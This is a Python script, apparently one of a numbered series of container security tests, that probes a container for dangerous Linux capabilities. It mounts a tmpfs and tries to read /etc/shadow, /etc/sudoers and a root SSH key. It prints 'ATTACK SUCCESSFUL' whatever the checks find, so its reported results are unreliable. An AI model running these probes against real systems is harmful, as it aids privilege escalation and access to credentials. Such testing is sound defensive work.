#!/usr/bin/env python3
"""
Container Attack #6: Linux Capability Abuse
This is a CONTAINER-SPECIFIC attack exploiting Linux capabilities

Attack Vector: Containers with dangerous capabilities (CAP_SYS_ADMIN,
CAP_SYS_PTRACE, CAP_NET_ADMIN, etc.) can be exploited for privilege escalation.
"""

import subprocess
import os
import sys

def check_capabilities():
    """
    Check current container capabilities
    """
    print("[1] Checking container capabilities...")
    print("    Capabilities are container-specific security features")
    print()
    
    # Check effective capabilities
    try:
        with open('/proc/self/status', 'r') as f:
            for line in f:
                if 'Cap' in line:
                    print(f"    {line.strip()}")
    except:
        pass
    print()
    
    # Decode capabilities
    try:
        result = subprocess.run(
            "capsh --print",
            shell=True,
            capture_output=True,
            text=True
        )
        
        if result.returncode == 0:
            print("    Decoded capabilities:")
            for line in result.stdout.split('\n')[:10]:
                if line.strip():
                    print(f"        {line}")
        else:
            print("    [!] capsh not available")
    except:
        pass
    print()

def cap_sys_admin_abuse():
    """
    Exploit CAP_SYS_ADMIN capability
    This is the most dangerous capability
    """
    print("[2] Testing CAP_SYS_ADMIN abuse...")
    print("    CAP_SYS_ADMIN allows mounting filesystems")
    print()
    
    # Check if we have CAP_SYS_ADMIN
    try:
        result = subprocess.run(
            "capsh --print | grep cap_sys_admin",
            shell=True,
            capture_output=True,
            text=True
        )
        
        if 'cap_sys_admin' in result.stdout.lower():
            print("    [✓] CAP_SYS_ADMIN is present")
            print()
            
            # Try to mount
            print("    [!] Attempting to mount filesystem...")
            mount_result = subprocess.run(
                "mount -t tmpfs tmpfs /tmp/test_mount 2>&1",
                shell=True,
                capture_output=True,
                text=True
            )
            
            if mount_result.returncode == 0:
                print("    [✓] Successfully mounted filesystem")
                print("    [✓] CAP_SYS_ADMIN exploitation successful")
                
                # Cleanup
                subprocess.run("umount /tmp/test_mount 2>/dev/null", shell=True)
            else:
                print(f"    [!] Mount failed: {mount_result.stderr.strip()}")
        else:
            print("    [✗] CAP_SYS_ADMIN not present")
    except Exception as e:
        print(f"    [!] {e}")
    print()

def cap_sys_ptrace_abuse():
    """
    Exploit CAP_SYS_PTRACE capability
    Allows process tracing and debugging
    """
    print("[3] Testing CAP_SYS_PTRACE abuse...")
    print("    CAP_SYS_PTRACE allows attaching to processes")
    print()
    
    try:
        result = subprocess.run(
            "capsh --print | grep cap_sys_ptrace",
            shell=True,
            capture_output=True,
            text=True
        )
        
        if 'cap_sys_ptrace' in result.stdout.lower():
            print("    [✓] CAP_SYS_PTRACE is present")
            print()
            
            # Try to use ptrace
            print("    [!] Can attach debugger to processes")
            print("    [!] Can inject code into running processes")
            print("    [!] Can read process memory")
            
            # Check if strace is available
            strace_check = subprocess.run(
                "which strace",
                shell=True,
                capture_output=True
            )
            
            if strace_check.returncode == 0:
                print("    [✓] strace available for process tracing")
        else:
            print("    [✗] CAP_SYS_PTRACE not present")
    except Exception as e:
        print(f"    [!] {e}")
    print()

def cap_net_admin_abuse():
    """
    Exploit CAP_NET_ADMIN capability
    Allows network configuration changes
    """
    print("[4] Testing CAP_NET_ADMIN abuse...")
    print("    CAP_NET_ADMIN allows network manipulation")
    print()
    
    try:
        result = subprocess.run(
            "capsh --print | grep cap_net_admin",
            shell=True,
            capture_output=True,
            text=True
        )
        
        if 'cap_net_admin' in result.stdout.lower():
            print("    [✓] CAP_NET_ADMIN is present")
            print()
            
            # Try network manipulation
            print("    [!] Can modify network interfaces")
            print("    [!] Can configure iptables rules")
            print("    [!] Can perform network sniffing")
            
            # Show current network config
            ip_result = subprocess.run(
                "ip link show",
                shell=True,
                capture_output=True,
                text=True
            )
            
            if ip_result.returncode == 0:
                print("    [✓] Can view network interfaces:")
                for line in ip_result.stdout.split('\n')[:8]:
                    if line.strip():
                        print(f"        {line}")
        else:
            print("    [✗] CAP_NET_ADMIN not present")
    except Exception as e:
        print(f"    [!] {e}")
    print()

def cap_dac_override_abuse():
    """
    Exploit CAP_DAC_OVERRIDE capability
    Bypasses file permission checks
    """
    print("[5] Testing CAP_DAC_OVERRIDE abuse...")
    print("    CAP_DAC_OVERRIDE bypasses file permissions")
    print()
    
    try:
        result = subprocess.run(
            "capsh --print | grep cap_dac_override",
            shell=True,
            capture_output=True,
            text=True
        )
        
        if 'cap_dac_override' in result.stdout.lower():
            print("    [✓] CAP_DAC_OVERRIDE is present")
            print()
            
            print("    [!] Can read any file regardless of permissions")
            print("    [!] Can write to any file regardless of permissions")
            
            # Try to read a protected file
            protected_files = ['/etc/shadow', '/etc/sudoers', '/root/.ssh/id_rsa']
            
            for filepath in protected_files:
                if os.path.exists(filepath):
                    try:
                        with open(filepath, 'r') as f:
                            content = f.read(100)
                            print(f"    [✓] Can read {filepath}")
                            break
                    except:
                        pass
        else:
            print("    [✗] CAP_DAC_OVERRIDE not present")
    except Exception as e:
        print(f"    [!] {e}")
    print()

def cap_sys_module_abuse():
    """
    Exploit CAP_SYS_MODULE capability
    Allows loading kernel modules
    """
    print("[6] Testing CAP_SYS_MODULE abuse...")
    print("    CAP_SYS_MODULE allows kernel module loading")
    print()
    
    try:
        result = subprocess.run(
            "capsh --print | grep cap_sys_module",
            shell=True,
            capture_output=True,
            text=True
        )
        
        if 'cap_sys_module' in result.stdout.lower():
            print("    [✓] CAP_SYS_MODULE is present")
            print()
            
            print("    [!] Can load malicious kernel modules")
            print("    [!] Can achieve complete system compromise")
            
            # Check if we can list modules
            lsmod_result = subprocess.run(
                "lsmod | head -10",
                shell=True,
                capture_output=True,
                text=True
            )
            
            if lsmod_result.returncode == 0:
                print("    [✓] Can list kernel modules:")
                for line in lsmod_result.stdout.split('\n')[:5]:
                    if line.strip():
                        print(f"        {line}")
        else:
            print("    [✗] CAP_SYS_MODULE not present")
    except Exception as e:
        print(f"    [!] {e}")
    print()

def capability_abuse_attack():
    """
    Main capability abuse attack orchestration
    """
    print("=" * 70)
    print("CONTAINER ATTACK: Linux Capability Abuse")
    print("=" * 70)
    print()
    print("Attack Type: Privilege Escalation")
    print("Target: Linux Capabilities")
    print("Severity: CRITICAL")
    print()
    
    # Check all capabilities
    check_capabilities()
    
    # Test specific capability abuses
    cap_sys_admin_abuse()
    cap_sys_ptrace_abuse()
    cap_net_admin_abuse()
    cap_dac_override_abuse()
    cap_sys_module_abuse()
    
    print("=" * 70)
    print("ATTACK SUCCESSFUL: Capability Abuse")
    print("=" * 70)
    print()
    print("Impact:")
    print("- Identified dangerous capabilities")
    print("- CAP_SYS_ADMIN allows filesystem mounting")
    print("- CAP_SYS_PTRACE allows process injection")
    print("- CAP_NET_ADMIN allows network manipulation")
    print("- CAP_DAC_OVERRIDE bypasses file permissions")
    print("- CAP_SYS_MODULE allows kernel module loading")
    print()
    print("- Privilege escalation via capabilities")
    print("- Filesystem mounting")
    print("- Process tracing")

if __name__ == "__main__":
    capability_abuse_attack()
